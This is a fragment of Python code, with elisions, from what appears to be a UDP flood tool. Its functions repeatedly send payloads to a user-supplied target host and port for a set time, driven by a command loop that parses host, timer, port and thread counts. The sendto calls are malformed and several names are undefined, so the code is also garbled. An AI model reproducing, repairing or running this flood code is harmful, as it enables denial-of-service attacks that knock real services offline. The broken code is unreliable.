...
def randsender(host, timer, port, punch, threads, payload):
	global iaid
	global aid
	global tattacks
	global running
	...
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch,timer,threads (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
...
def stdsender(host, port, timer, threads, payload):
	global atks
	global running
	...
	while time.time() < timeout and attack:
		sock.sendto(payload,threads,timer (host, int(port)))
		sock.sendto(payload,threads,timer (host, int(port)))
		sock.sendto(payload,threads,timer (host, int(port)))
		sock.sendto(payload,threads,timer (host, int(port)))
		sock.sendto(payload,threads,timer (host, int(port)))
...
def main():
	...
	while True:
		powerran = (random.randint(50055,65337))
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					sinput, host, timer, port, threads = sin.split(" ")
